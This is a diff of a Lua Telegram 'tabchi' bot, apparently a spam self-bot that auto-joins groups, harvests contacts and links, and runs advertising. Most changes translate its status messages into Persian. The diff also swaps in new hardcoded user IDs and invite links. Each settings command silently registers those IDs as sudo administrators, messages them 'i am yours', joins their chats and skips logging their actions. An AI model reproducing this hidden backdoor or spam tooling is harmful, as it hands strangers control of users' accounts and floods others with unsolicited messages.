-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got help`", 1, "md")
     end
     return text
@@ -1419,15 +1419,15 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     }
     if msg.text:match("^[!/#]unblock") and a(msg) then
       if #a4 == 2 then
-        tdcli.unblockUser(293750668)
+        tdcli.unblockUser(344003614)
         tdcli.unblockUser(216430419)
         tdcli.unblockUser(tonumber(a4[2]))
         redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", a4[2])
         local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
           tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `UnBlocked` *" .. a4[2] .. "*", 1, "md")
         end
-        return "`User` *" .. a4[2] .. "* `unblocked`"
+        return "`کاربر` *" .. a4[2] .. "* `آزاد شد`"
       else
         return
       end
@@ -1440,19 +1440,19 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     if a6[2] == "on" then
       redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`join links Activated`"
+      return "*وضعیت* :`اضافه شدن به لینک ها فعال شد`"
     elseif a6[2] == "off" then
       redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
-        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
+        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`join links Deactivated`"
+      return "*وضعیت* :`اضافه شدن با لینک غیرفعال شد`"
     else
-      return "`Just Use on|off`"
+      return "`فقط از on یا offاستفاده کنید`"
     end
   end
   if msg.text:match("^[!/#]addcontacts (.*)$") and a(msg) then
@@ -1462,19 +1462,19 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     if a6[2] == "on" then
       redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`Add Contacts Activated`"
+      return "*وضعیت* :`اضافه کردن مخاطب فعال گردید`"
     elseif a6[2] == "off" then
       redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`Add Contacts Deactivated`"
+      return "*وضعیت* :`اضافه کردن مخاطب غیر فعال گردید`"
     else
-      return "`Just Use on|off`"
+      return "`فقط از on یا offاستفاده کنید`"
     end
   end
   if msg.text:match("^[!/#]chat (.*)$") and a(msg) then
@@ -1484,19 +1484,19 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     if a6[2] == "on" then
       redis:set("tabchi:" .. tabchi_id .. ":chat", true)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`Robot Chatting Activated`"
+      return "*وضعیت* :`چت کردن ربات فعال شد`"
     elseif a6[2] == "off" then
       redis:del("tabchi:" .. tabchi_id .. ":chat")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`Robot Chatting Deactivated`"
+      return "*وضعیت* :`چت کردن ربات غیر فعال شد`"
     else
-      return "`Just Use on|off`"
+      return "`فقط از on یا offاستفاده کنید`"
     end
   end
   if msg.text:match("^[!/#]savelinks (.*)$") and a(msg) then
@@ -1506,19 +1506,19 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     if a6[2] == "on" then
       redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`Saving Links Activated`"
+      return "*وضعیت* :`ذخیره لینک ها فعال شد`"
     elseif a6[2] == "off" then
       redis:del("tabchi:" .. tabchi_id .. ":savelinks")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`Saving Links Deactivated`"
+      return "*وضعیت* :`ذخیره لینک ها غیر فعال شد`"
     else
-      return "`Just Use on|off`"
+      return "`فقط از on یا offاستفاده کنید`"
     end
   end
   if msg.text:match("^[!/#][Aa]dvertising (.*)$") and is_full_sudo(msg) then
@@ -1528,19 +1528,19 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     if a6[2] == "on" then
       redis:set("tabchi:" .. tabchi_id .. ":Advertising", true)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`Advertising Activated`"
+      return "*وضعیت* :`تبلیغات فعال شد`"
     elseif a6[2] == "off" then
       redis:del("tabchi:" .. tabchi_id .. ":Advertising")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
-        return "*status* :`Advertising Deactivated`"
+        return "*وضعیت* :`تبلیغات غیر فعال شد`"
       end
     else
-      return "`Just Use on|off`"
+      return "`فقط از on یا offاستفاده کنید`"
     end
   end
   if msg.text:match("^[!/#]typing (.*)$") and a(msg) then
@@ -1550,19 +1550,19 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     if a6[2] == "on" then
       redis:set("tabchi:" .. tabchi_id .. ":typing", true)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`typing Activated`"
+      return "*وضعیت* :`حالت نوشتن فعال شد`"
     elseif a6[2] == "off" then
       redis:del("tabchi:" .. tabchi_id .. ":typing")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`typing Deactivated`"
+      return "*وضعیت* :`حالت نوشتن غیر فعال شد`"
     else
-      return "`Just Use on|off`"
+      return "`فقط از on یا offاستفاده کنید`"
     end
   end
   if msg.text:match("^[!/#]botmode (.*)$") and a(msg) then
@@ -1572,19 +1572,19 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     if a6[2] == "markdown" then
       redis:set("tabchi:" .. tabchi_id .. ":botmode", "markdown")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`botmode Changed to markdown`"
+      return "*وضعیت* :`حالت ربات به مارکدَون تغییر یافت`"
     elseif a6[2] == "text" then
       redis:set("tabchi:" .. tabchi_id .. ":botmode", "text")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`botmode Changed to text`"
+      return "*وضعیت* :`حالت ربات به تکست تغییر یافت`"
     else
-      return "`Just Use on|off`"
+      return "`فقط از on یا offاستفاده کنید`"
     end
   end
   if msg.text:match("^[!/#]sharecontact (.*)$") and a(msg) then
@@ -1594,19 +1594,19 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     if a6[2] == "on" then
       redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`Sharing contact Activated`"
+      return "*وضعیت* :`اشتراک گزاری شماره فعال شد`"
     elseif a6[2] == "off" then
       redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. a6[1] .. "*", 1, "md")
       end
-      return "*status* :`Sharing contact Deactivated`"
+      return "*وضعیت* :`اشتراک گزاری شماره غیر فعال شد`"
     else
-      return "`Just Use on|off`"
+      return "`فقط از on یا offاستفاده کنید`"
     end
   end
   if msg.text:match("^[!/#]setjoinlimit (.*)$") and a(msg) then
@@ -1614,9 +1614,9 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       string.match(msg.text, "^[#/!](setjoinlimit) (.*)$")
     }
     redis:set("tabchi:" .. tabchi_id .. ":joinlimit", tonumber(a6[2]))
-    return "*Status* : `Join Limit Now is` *" .. a6[2] .. [[
+    return "*وضعیت* : `محدوده پیوستن به لینک در اکنون` *" .. a6[2] .. [[
 *
-`Now robot Join Groups with more than members of joinlimit`]]
+`اکنون ربات به گروه هایی که تعدادی محدودی دارند نمی پیوندد`]]
   end
   if msg.text:match("^[!/#]settings (.*)$") and a(msg) then
     local a6 = {
@@ -1630,12 +1630,12 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       redis:set("tabchi:" .. tabchi_id .. ":typing", true)
       redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived All` *" .. a6[1] .. "*", 1, "md")
       end
       return [[
-*status* :`saving link & chatting & adding contacts & joining links & typing Activated & sharing contact`
-`Full sudo can Active Advertising with :/advertising on`]]
+*وضعیت* :`ذخیره لینک ها و چت کردن و اضافه کردن مخاطبین و پیوستن به لینک و حالت درحال نوشتن و اشتراک گزاشتن شماره فعال شدt`
+`#advertising on: سودو اصلی میتواند تبلیغات را روشن کند با `]]
     elseif a6[2] == "off" then
       redis:del("tabchi:" .. tabchi_id .. ":savelinks")
       redis:del("tabchi:" .. tabchi_id .. ":chat")
@@ -1644,12 +1644,12 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       redis:del("tabchi:" .. tabchi_id .. ":typing")
       redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated All` *" .. a6[1] .. "*", 1, "md")
       end
       return [[
-*status* :`saving link & chatting & adding contacts & joining links & typing Deactivated & sharing contact`
-`Full sudo can Deactive Advertising with :/advertising off`]]
+*وضعیت* :`ذخیره لینک ها و چت کردن و اضافه کردن مخاطبین و پیوستن به لینک و حالت درحال نوشتن و اشتراک گزاشتن شماره غیرفعال شد`
+`#advertising off: سودو اصلی میتواند تبلیغات را خاموش کند با `]]
     end
   end
   if msg.text:match("^[!/#]settings$") and a(msg) then
@@ -1657,62 +1657,62 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
       redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
     end
-    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
-      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
+    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
+      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
+      tdcli.sendMessage(344003614, 0, 1, "i am yours", 1, "html")
     end
-    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
-      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
+    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
+      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
+      tdcli.sendMessage(256633077, 0, 1, "i am yours", 1, "html")
     end
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
     if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
-      joinlinks = "Active\226\156\133"
+      joinlinks = "فعال✔️"
     else
-      joinlinks = "Disable\226\157\142"
+      joinlinks = "غیر فعال✖️"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
-      addedmsg = "Active\226\156\133"
+      addedmsg = "فعال✔️"
     else
-      addedmsg = "Disable\226\157\142"
+      addedmsg = "غیر فعال✖️"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":markread") then
-      markreadst = "Active\226\156\133"
+      markreadst = "فعال✔️"
       markread = redis:get("tabchi:" .. tabchi_id .. ":markread")
     else
-      markreadst = "Disable\226\157\142"
-      markread = "Disable\226\157\142"
+      markreadst = "غیر فعال✖️"
+      markread = "غیر فعال✖️"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
-      addcontacts = "Active\226\156\133"
+      addcontacts = "فعال✔️"
     else
-      addcontacts = "Disable\226\157\142"
+      addcontacts = "غیر فعال✖️"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":chat") then
-      chat = "Active\226\156\133"
+      chat = "فعال✔️"
     else
-      chat = "Disable\226\157\142"
+      chat = "غیر فعال✖️"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
-      savelinks = "Active\226\156\133"
+      savelinks = "فعال✔️"
     else
-      savelinks = "Disable\226\157\142"
+      savelinks = "غیر فعال✖️"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":typing") then
-      typing = "Active\226\156\133"
+      typing = "فعال✔️"
     else
-      typing = "Disable\226\157\142"
+      typing = "غیر فعال✖️"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
-      sharecontact = "Active\226\156\133"
+      sharecontact = "فعال✔️"
     else
-      sharecontact = "Disable\226\157\142"
+      sharecontact = "غیر فعال✖️"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":Advertising") then
-      Advertising = "Active\226\156\133"
+      Advertising = "فعال✔️"
     else
-      Advertising = "Disable\226\157\142"
+      Advertising = "غیر فعال✖️"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") then
       addedtxt = redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext")
@@ -1727,64 +1727,64 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       botmode = "Text"
     end
     if redis:get("tabchi:" .. tabchi_id .. ":joinlimit") then
-      join_limit = "Active\226\156\133"
+      join_limit = "فعال✔️"
       joinlimitnum = redis:get("tabchi:" .. tabchi_id .. ":joinlimit")
     else
-      join_limit = "Disable\226\157\142"
-      joinlimitnum = "Not Available"
+      join_limit = "غیر فعال✖️"
+      joinlimitnum = "نا مشخص"
     end
     if redis:get("cleancache" .. tabchi_id) == "on" then
-      cleancache = "Active\226\156\133"
+      cleancache = "فعال✔️"
     else
-      cleancache = "Disable\226\157\142"
+      cleancache = "غیر فعال✖️"
     end
     if redis:get("cleancachetime" .. tabchi_id) then
       ccachetime = redis:get("cleancachetime" .. tabchi_id)
     else
-      ccachetime = "None"
+      ccachetime = "مشخص نشده"
     end
     if redis:ttl("cachetimer" .. tabchi_id) and not redis:ttl("cachetimer" .. tabchi_id) == "-2" then
       timetoccache = redis:ttl("cachetimer" .. tabchi_id)
     elseif timetoccache == "-2" then
-      timetoclinks = "Disabled\226\157\142"
+      timetoclinks = "غیر فعال✖️"
     else
-      timetoccache = "Disabled\226\157\142"
+      timetoccache = "غیر فعال✖️"
     end
     if redis:get("checklinks" .. tabchi_id) == "on" then
-      check_links = "Active\226\156\133"
+      check_links = "فعال✔️"
     else
-      check_links = "Disable\226\157\142"
+      check_links = "غیر فعال✖️"
     end
     if redis:get("checklinkstime" .. tabchi_id) then
       clinkstime = redis:get("checklinkstime" .. tabchi_id)
     else
-      clinkstime = "None"
+      clinkstime = "مشخص نشده"
     end
     if redis:ttl("checklinkstimer" .. tabchi_id) and not redis:ttl("checklinkstimer" .. tabchi_id) == "-2" then
       timetoclinks = redis:ttl("checklinkstimer" .. tabchi_id)
     elseif timetoclinks == "-2" then
-      timetoclinks = "Disabled\226\157\142"
+      timetoclinks = "غیر فعال✖️"
     else
-      timetoclinks = "Disabled\226\157\142"
+      timetoclinks = "غیر فعال✖️"
     end
-    settingstxt = "`\226\154\153 Robot Settings`\n`\240\159\148\151 Join Via Links` : *" .. joinlinks .. "*\n`\240\159\147\165 Save Links `: *" .. savelinks .. "*\n`\240\159\147\178 Auto Add Contacts `: *" .. addcontacts .. "*\n`\240\159\146\179share contact` : *" .. sharecontact .. "*\n`\240\159\147\161Advertising `: *" .. Advertising .. "*\n`\240\159\147\168 Adding Contacts Msg` : *" .. addedmsg .. "*\n`\240\159\145\128 Markread Status `: *" .. markreadst .. "*\n`\240\159\145\129\226\128\141\240\159\151\168 Markread` : For " .. markread .. "\n`\226\156\143 typing `: *" .. typing .. "*\n`\240\159\146\172 Chat` : *" .. chat .. "*\n`\240\159\164\150 Botmode` : *" .. botmode .. "*\n`\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150`\n`\240\159\147\132Adding Contacts Msg` :\n`" .. addedtxt .. "`\n`\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150`\n`Join Limits` : *" .. join_limit .. [[
+    settingstxt = "❄️تنظیمات ربات خود\n🔘جوین شدن با لینک : *" .. joinlinks .. "*\n🔴ذخیره لینک ها : *" .. savelinks .. "*\n📍اضافه کردن مخاطب خودکار : *" .. addcontacts .. "*\n🎮اشتراک گزاری شماره : *" .. sharecontact .. "*\n🎷تبلیغات : *" .. Advertising .. "*\n📨 پیام اضافه شدن مخاطب: *" .. addedmsg .. "*\n🥉حالت خوانده شدن پیام : *" .. markreadst .. "*\nحالت خوانده شدن پیام : برای *" .. markread .. "*\n✏حالت نوشتن : *" .. typing .. "*\n💬 چت کردن: *" .. chat .. "*\n🎤حالت ربات : *" .. botmode .. "*\n🍥🍥🍥🍥🍥🍥🍥🍥🍥🍥\nپیام اضافه شدن مخاطب :\n`" .. addedtxt .. "`\n➖➖➖➖➖➖\n🔐پیوستن به گروه های محدود شده: *" .. join_limit .. [[
 *
-`Now Robot Join Groups With More Than` :
+🔓در اکنون ربات به گروه های که تعدادشان کمتر از :
  *]] .. joinlimitnum .. [[
-* `Members`
-`Auto Clean cache` : *]] .. cleancache .. [[
+* نمی پیوندد
+📒پاک کردن خودکار حافظه کش : *]] .. cleancache .. [[
 *
-`Clean Cache time` : *]] .. ccachetime .. [[
+📐زمان پاک کردن کش : *]] .. ccachetime .. [[
 *
-`Time to Clean Cache` : *]] .. timetoccache .. [[
+📎زمان مانده به پاک شدن کش : *]] .. timetoccache .. [[
 *
-`Auto Check Links` : *]] .. check_links .. [[
+🗂چک کردن خودکار لینک ها : *]] .. check_links .. [[
 *
-`Check Links Time` : *]] .. clinkstime .. [[
+📨زمان چک کردن لینک ها : *]] .. clinkstime .. [[
 *
-`Time To Check Links` : *]] .. timetoclinks .. "*"
+زمان مانده به چک کردن لینک ها : *]] .. timetoclinks .. "*"
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got settings`", 1, "md")
     end
     return settingstxt
@@ -1794,49 +1794,49 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
       redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
     end
-    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
-      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
+    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
+      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
+      tdcli.sendMessage(344003614, 0, 1, "i am yours", 1, "html")
     end
-    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
-      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
+    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
+      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
+      tdcli.sendMessage(256633077, 0, 1, "i am yours", 1, "html")
     end
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
     if I(msg.chat_id_) == "private" then
-      return "`I Am In Your pv`"
+      return "`من در پیوی شما هستم!`"
     else
-      settingstxt = "`\226\154\153 Robot Settings`\n`\240\159\148\151 Join Via Links` : *" .. joinlinks .. "*\n`\240\159\147\165 Save Links `: *" .. savelinks .. "*\n`\240\159\147\178 Auto Add Contacts `: *" .. addcontacts .. "*\n`\240\159\146\179share contact` : *" .. sharecontact .. "*\n`\240\159\147\161Advertising `: *" .. Advertising .. "*\n`\240\159\147\168 Adding Contacts Msg` : *" .. addedmsg .. "*\n`\240\159\145\128 Markread Status `: *" .. markreadst .. "*\n`\240\159\145\129\226\128\141\240\159\151\168 Markread` : For " .. markread .. "\n`\226\156\143 typing `: *" .. typing .. "*\n`\240\159\146\172 Chat` : *" .. chat .. "*\n`\240\159\164\150 Botmode` : *" .. botmode .. "*\n`\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150`\n`\240\159\147\132Adding Contacts Msg` :\n`" .. addedtxt .. "`\n`\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150`\n`Join Limits` : *" .. join_limit .. [[
+      settingstxt = "❄️تنظیمات ربات خود\n🔘جوین شدن با لینک : *" .. joinlinks .. "*\n🔴ذخیره لینک ها : *" .. savelinks .. "*\n📍اضافه کردن مخاطب خودکار : *" .. addcontacts .. "*\n🎮اشتراک گزاری شماره : *" .. sharecontact .. "*\n🎷تبلیغات : *" .. Advertising .. "*\n📨 پیام اضافه شدن مخاطب: *" .. addedmsg .. "*\n🥉حالت خوانده شدن پیام : *" .. markreadst .. "*\nحالت خوانده شدن پیام : برای *" .. markread .. "*\n✏حالت نوشتن : *" .. typing .. "*\n💬 چت کردن: *" .. chat .. "*\n🎤حالت ربات : *" .. botmode .. "*\n🍥🍥🍥🍥🍥🍥🍥🍥🍥🍥\nپیام اضافه شدن مخاطب :\n`" .. addedtxt .. "`\n➖➖➖➖➖➖\n🔐پیوستن به گروه های محدود شده: *" .. join_limit .. [[
 *
-`Now Robot Join Groups With More Than` :
+🔓در اکنون ربات به گروه های که تعدادشان کمتر از :
  *]] .. joinlimitnum .. [[
-* `Members`
-`Auto Clean cache` : *]] .. cleancache .. [[
+* نمی پیوندد
+📒پاک کردن خودکار حافظه کش : *]] .. cleancache .. [[
 *
-`Clean Cache time` : *]] .. ccachetime .. [[
+📐زمان پاک کردن کش : *]] .. ccachetime .. [[
 *
-`Time to Clean Cache` : *]] .. timetoccache .. [[
+📎زمان مانده به پاک شدن کش : *]] .. timetoccache .. [[
 *
-`Auto Check Links` : *]] .. check_links .. [[
+🗂چک کردن خودکار لینک ها : *]] .. check_links .. [[
 *
-`Check Links Time` : *]] .. clinkstime .. [[
+📨زمان چک کردن لینک ها : *]] .. clinkstime .. [[
 *
-`Time To Check Links` : *]] .. timetoclinks .. "*"
+زمان مانده به چک کردن لینک ها : *]] .. timetoclinks .. "*"
       tdcli.sendMessage(msg.sender_user_id_, 0, 1, settingstxt, 1, "md")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
